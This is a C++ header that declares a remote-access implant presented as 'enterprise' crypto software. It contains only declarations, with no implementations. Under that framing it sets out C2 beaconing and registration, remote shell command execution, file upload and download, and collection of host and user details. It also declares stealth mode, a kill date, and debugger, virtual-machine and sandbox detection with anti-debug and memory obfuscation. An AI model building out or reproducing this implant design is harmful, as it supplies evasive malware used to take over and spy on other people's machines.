#pragma once

#include "tasks.h"
#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>
#include <chrono>
#include <map>
#include <memory>
#include <queue>

#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/uuid/uuid.hpp>
#include <boost/uuid/uuid_generators.hpp>
#include <boost/uuid/uuid_io.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/archive/iterators/base64_from_binary.hpp>
#include <boost/archive/iterators/binary_from_base64.hpp>
#include <boost/archive/iterators/transform_width.hpp>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

// Enterprise crypto structures
struct EncryptedMessage {
    std::string nonce;
    std::string ciphertext;
    std::string key_id;
    std::chrono::system_clock::time_point timestamp;
    
    std::string toJson() const;
    static EncryptedMessage fromJson(const std::string& json);
};

struct CryptoMetrics {
    uint64_t total_operations = 0;
    uint64_t successful_operations = 0;
    uint64_t failed_operations = 0;
    double average_duration_ms = 0.0;
    std::chrono::system_clock::time_point last_reset;
    std::map<std::string, uint64_t> operations_by_type;
    std::map<std::string, uint64_t> errors_by_type;
};

struct SecurityAlert {
    enum class Severity { LOW, MEDIUM, HIGH, CRITICAL };
    enum class Type { HIGH_FAILURE_RATE, SUSPICIOUS_ACTIVITY, BRUTE_FORCE_ATTEMPT, KEY_ROTATION_OVERDUE };
    
    Type alert_type;
    std::string message;
    std::chrono::system_clock::time_point timestamp;
    Severity severity;
    
    std::string toJson() const;
};

// Enterprise crypto manager
class EnterpriseCrypto {
public:
    EnterpriseCrypto();
    explicit EnterpriseCrypto(const std::string& base64_key);
    ~EnterpriseCrypto();

    // Core encryption/decryption
    EncryptedMessage encrypt(const std::string& plaintext);
    EncryptedMessage encrypt(const std::vector<uint8_t>& data);
    std::string decrypt(const EncryptedMessage& encrypted);
    std::vector<uint8_t> decryptToBytes(const EncryptedMessage& encrypted);

    // JSON encryption for structured data
    EncryptedMessage encryptJson(const boost::property_tree::ptree& json);
    boost::property_tree::ptree decryptJson(const EncryptedMessage& encrypted);

    // Key management
    std::string getCurrentKeyId() const;
    bool needsRotation() const;
    std::string rotateKey();
    void setRotationPolicy(uint64_t max_operations, std::chrono::seconds max_age);

    // Monitoring
    CryptoMetrics getMetrics() const;
    std::vector<SecurityAlert> getAlerts() const;
    void resetMetrics();

    // Rate limiting
    bool checkRateLimit(const std::string& client_id);
    void setRateLimits(uint64_t ops_per_minute, uint64_t ops_per_hour);

    // Advanced obfuscation (enhanced from original)
    std::string advancedObfuscateEncode(const std::string& data);
    std::string advancedObfuscateDecode(const std::string& encoded);
    bool isAdvancedObfuscated(const std::string& data);

private:
    struct KeyInfo {
        std::string key_id;
        std::vector<uint8_t> key_data;
        std::chrono::system_clock::time_point created_at;
        uint64_t usage_count;
        bool is_current;
    };

    struct RateLimitEntry {
        uint64_t count_minute = 0;
        uint64_t count_hour = 0;
        std::chrono::steady_clock::time_point last_reset_minute;
        std::chrono::steady_clock::time_point last_reset_hour;
        std::chrono::steady_clock::time_point blocked_until;
    };

    // Crypto state
    std::vector<KeyInfo> keys;
    size_t current_key_index;
    mutable std::mutex crypto_mutex;

    // Rotation policy
    uint64_t max_operations_per_key = 100000;
    std::chrono::seconds key_rotation_threshold{86400}; // 24 hours

    // Monitoring
    mutable std::mutex metrics_mutex;
    CryptoMetrics metrics;
    std::queue<SecurityAlert> alerts;
    static constexpr size_t MAX_ALERTS = 1000;

    // Rate limiting
    mutable std::mutex rate_limit_mutex;
    std::map<std::string, RateLimitEntry> rate_limits;
    uint64_t max_ops_per_minute = 1000;
    uint64_t max_ops_per_hour = 50000;
    std::chrono::minutes block_duration{15};

    // Private methods
    std::string generateKeyId();
    std::vector<uint8_t> generateKey();
    std::vector<uint8_t> generateNonce();
    void logOperation(const std::string& operation, bool success, double duration_ms, const std::string& error = "");
    void updateMetrics(const std::string& operation, bool success, double duration_ms);
    void checkSecurityAlerts();
    KeyInfo* getCurrentKey();
    const KeyInfo* findKeyById(const std::string& key_id) const;

    // OpenSSL helpers
    bool aes_encrypt(const std::vector<uint8_t>& plaintext, const std::vector<uint8_t>& key,
                     const std::vector<uint8_t>& nonce, std::vector<uint8_t>& ciphertext);
    bool aes_decrypt(const std::vector<uint8_t>& ciphertext, const std::vector<uint8_t>& key,
                     const std::vector<uint8_t>& nonce, std::vector<uint8_t>& plaintext);
};

// Enhanced agent information with security features
struct EnterpriseAgentInfo {
    std::string id;
    std::string hostname;
    std::string username;
    std::string domain;
    std::string os;
    std::string arch;
    uint32_t process_id;
    std::string process_name;
    std::string integrity_level;
    std::string internal_ip;
    std::string working_directory;
    uint64_t sleep_interval;
    float jitter;
    std::string encryption_key_id; // Reference to current encryption key
    
    // Enterprise features
    std::string classification_level; // "public", "internal", "confidential"
    bool stealth_mode;
    bool anti_debug;
    std::chrono::system_clock::time_point last_key_rotation;
    std::chrono::system_clock::time_point kill_date;
    
    EnterpriseAgentInfo();
    void collectSystemInfo();
    std::string toJson() const;
    static EnterpriseAgentInfo fromJson(const std::string& json);
};

// Enhanced implant with enterprise crypto integration
struct EnterpriseImplant {
    EnterpriseImplant(std::string host, std::string port, std::string uri);
    EnterpriseImplant(std::string host, std::string port, std::string uri, std::string encryption_key);
    ~EnterpriseImplant();

    // Core functionality
    std::future<void> taskThread;
    void beacon();
    void setMeanDwell(double meanDwell);
    void setRunning(bool isRunning);
    void serviceTasks();
    bool registerWithC2();
    void updateSleepSettings(uint64_t newSleep, float newJitter);

    // Enterprise features
    void setClassificationLevel(const std::string& level);
    void enableStealthMode(bool enabled);
    void setKillDate(std::chrono::system_clock::time_point kill_date);
    bool performSecurityCheck();
    void rotateEncryptionKey();
    CryptoMetrics getCryptoMetrics() const;
    std::vector<SecurityAlert> getSecurityAlerts() const;

private:
    // Connection info
    const std::string host, port, uri;
    EnterpriseAgentInfo agentInfo;
    
    // Timing and randomization
    std::exponential_distribution<double> dwellDistributionSeconds;
    std::atomic_bool isRunning;
    std::random_device device;
    std::mt19937 generator;
    
    // Thread safety
    std::mutex taskMutex, resultsMutex, cryptoMutex;
    
    // Task management
    boost::property_tree::ptree results;
    std::vector<Task> tasks;
    std::vector<TaskResult> taskResults;
    
    // UUID generation
    boost::uuids::random_generator uuidGenerator;
    static std::random_device rd;
    static std::mt19937 gen;

    // Enterprise crypto
    std::unique_ptr<EnterpriseCrypto> crypto;
    bool encryptionEnabled;

    // Security features
    bool antiDebugEnabled;
    std::chrono::system_clock::time_point lastSecurityCheck;
    std::chrono::seconds securityCheckInterval{300}; // 5 minutes

    // C2 communication with enterprise crypto
    void parseTasks(const std::string &response);
    std::string sendResults();
    std::string createBeaconData();
    std::string encryptPayload(const std::string &plaintext);
    std::string decryptPayload(const std::string &ciphertext);

    // Enhanced task execution
    TaskResult executeTask(const Task& task);
    TaskResult executeShellCommand(const Task& task);
    TaskResult executeSystemInfo(const Task& task);
    TaskResult executeProcessList(const Task& task);
    TaskResult executeFileList(const Task& task);
    TaskResult executeDownload(const Task& task);
    TaskResult executeUpload(const Task& task);
    TaskResult executeCryptoStatus(const Task& task);
    TaskResult executeKeyRotation(const Task& task);
    TaskResult executeSecurityCheck(const Task& task);

    // Security and anti-analysis
    bool detectDebugger();
    bool detectVirtualMachine();
    bool detectSandbox();
    void performAntiDebug();
    void obfuscateMemory();
    
    // Utility functions
    std::string generateRandomId(size_t length = 16);
    std::chrono::milliseconds calculateSleepTime();
    bool isKillDateReached();
    void logError(const std::string& error);
    void logSecurityEvent(const std::string& event);
    
    // Enhanced base64 and obfuscation
    std::string base64Encode(const std::vector<uint8_t>& data);
    std::string base64Encode(const std::string& data);
    std::vector<uint8_t> base64Decode(const std::string& encoded);
    std::string base64DecodeString(const std::string& encoded);
    
    // File operations with encryption
    std::vector<uint8_t> readFileToBytes(const std::string& filepath);
    bool writeBytesToFile(const std::string& filepath, const std::vector<uint8_t>& data);
    bool fileExists(const std::string& filepath);
    
    // Command processing with advanced crypto
    std::string decodeCommand(const std::string& encoded_command);
    std::string encodeOutput(const std::string& output);
    
    // UUID generation helpers
    std::string generateAgentId();
    std::string generateTaskId();
    std::string generateSessionId();

    // Memory protection
    void clearSensitiveMemory(void* ptr, size_t size);
    void protectSensitiveData();
};

// Enhanced HTTP communication with enterprise features
std::string sendHttpRequestSecure(std::string_view host, std::string_view port, 
                                std::string_view uri, std::string_view payload,
                                const std::map<std::string, std::string>& headers = {},
                                bool verify_ssl = true);

// System information gathering (enhanced)
std::string getHostname();
std::string getCurrentUsername();
std::string getDomainName();
std::string getOperatingSystem();
std::string getArchitecture();
std::string getProcessName();
std::string getIntegrityLevel();
std::string getInternalIP();
std::string getCurrentWorkingDirectory();
uint32_t getCurrentProcessId();
std::string getSystemUUID();
bool isRunningInVM();
bool isDebuggerPresent();

// Enterprise utility functions
std::string getCurrentTimestamp();
std::string hashString(const std::string& input);
bool isValidBase64(const std::string& input);
std::vector<std::string> splitString(const std::string& str, char delimiter);
std::string joinStrings(const std::vector<std::string>& strings, const std::string& delimiter);
void secureZeroMemory(void* ptr, size_t size);

// Configuration management
struct EnterpriseConfig {
    std::string c2_host;
    std::string c2_port;
    std::string c2_uri;
    uint64_t sleep_interval = 5;
    float jitter = 0.2f;
    bool encryption_enabled = true;
    bool stealth_mode = false;
    bool anti_debug = true;
    std::string classification_level = "internal";
    std::chrono::system_clock::time_point kill_date;
    
    static EnterpriseConfig fromJson(const std::string& json);
    std::string toJson() const;
    bool validate() const;
};

// Error codes for enterprise operations
enum class EnterpriseError {
    SUCCESS = 0,
    CRYPTO_ERROR = 1,
    NETWORK_ERROR = 2,
    AUTHENTICATION_ERROR = 3,
    RATE_LIMITED = 4,
    SECURITY_VIOLATION = 5,
    KILL_DATE_REACHED = 6,
    DEBUG_DETECTED = 7,
    VM_DETECTED = 8,
    SANDBOX_DETECTED = 9,
    INVALID_COMMAND = 10,
    FILE_ERROR = 11,
    SYSTEM_ERROR = 12
};

std::string errorToString(EnterpriseError error);